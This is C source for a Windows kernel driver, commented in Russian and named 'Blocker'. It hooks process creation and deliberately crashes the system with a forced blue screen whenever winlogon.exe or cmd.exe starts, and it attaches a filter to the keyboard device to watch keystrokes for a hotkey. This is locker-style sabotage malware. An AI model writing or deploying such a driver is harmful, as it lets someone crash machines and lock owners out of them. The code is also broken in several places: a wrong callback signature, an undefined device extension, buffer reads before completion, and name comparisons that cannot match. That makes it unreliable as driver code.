#include <ntddk.h>
#include <kbdmou.h>
#include <ntddkbd.h>

// Глобальные переменные
BOOLEAN g_IsBlocked = TRUE;
PDEVICE_OBJECT g_KeyboardDevice = NULL;
UNICODE_STRING g_DeviceName;
UNICODE_STRING g_DosDeviceName;
PDEVICE_OBJECT g_LowerDevice = NULL;

// Прототипы
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
NTSTATUS DispatchPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS CreateProcessNotifyRoutine(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
NTSTATUS KeyboardClassRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Обработка клавиатуры (поиск Win+Alt+Insert)
NTSTATUS KeyboardClassRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = DispatchPassThrough(DeviceObject, Irp);
    
    if (NT_SUCCESS(status) && irpSp->Parameters.Read.Length > 0) {
        PKEYBOARD_INPUT_DATA keyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        ULONG numKeys = irpSp->Parameters.Read.Length / sizeof(KEYBOARD_INPUT_DATA);
        
        for (ULONG i = 0; i < numKeys; i++) {
            // 0x5B - LWin, 0x38 - Alt, 0x52 - Insert (Scan Codes)
            if (keyData[i].MakeCode == 0x5B && keyData[i].Flags == 0) {
                // Логика определения комбинации опущена для краткости, 
                // в реальном драйвере нужно отслеживать состояние клавиш (Flags == KEY_MAKE)
                DbgPrint("[Blocker] Нажата Win...\n");
            }
        }
    }
    return status;
}

// Перехват создания процессов
NTSTATUS CreateProcessNotifyRoutine(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
    if (!g_IsBlocked || CreateInfo == NULL) return STATUS_SUCCESS;

    if (CreateInfo->ImageFileName != NULL) {
        UNICODE_STRING target1, target2;
        RtlInitUnicodeString(&target1, L"winlogon.exe");
        RtlInitUnicodeString(&target2, L"cmd.exe");

        if (RtlCompareUnicodeString(CreateInfo->ImageFileName, &target1, TRUE) == 0 ||
            RtlCompareUnicodeString(CreateInfo->ImageFileName, &target2, TRUE) == 0) {
            
            DbgPrint("[Blocker] Блокировка процесса! BSOD...\n");
            KeBugCheckEx(0xDEADBEEF, (ULONG_PTR)ProcessId, 0, 0, 0);
        }
    }
    return STATUS_SUCCESS;
}

NTSTATUS DispatchPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerDevice, Irp);
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);
    if (g_KeyboardDevice) {
        IoDetachDevice(g_LowerDevice);
        IoDeleteDevice(g_KeyboardDevice);
    }
    DbgPrint("[Blocker] Выгружен.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DbgPrint("[Blocker] Загрузка...\n");
    DriverObject->DriverUnload = DriverUnload;
    
    // Блокировка процессов
    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);

    // Привязка к драйверу клавиатуры
    RtlInitUnicodeString(&g_DeviceName, L"\\Device\\KeyboardClass0");
    RtlInitUnicodeString(&g_DosDeviceName, L"\\DosDevices\\KeyboardClass0");

    NTSTATUS status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &g_DeviceName, FILE_DEVICE_KEYBOARD, 0, FALSE, &g_KeyboardDevice);
    if (!NT_SUCCESS(status)) return status;

    status = IoAttachDevice(g_KeyboardDevice, &g_DosDeviceName, &g_LowerDevice);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_KeyboardDevice);
        return status;
    }

    // Подмена обработчика чтения
    DriverObject->MajorFunction[IRP_MJ_READ] = KeyboardClassRead;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchPassThrough;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchPassThrough;

    return STATUS_SUCCESS;
}
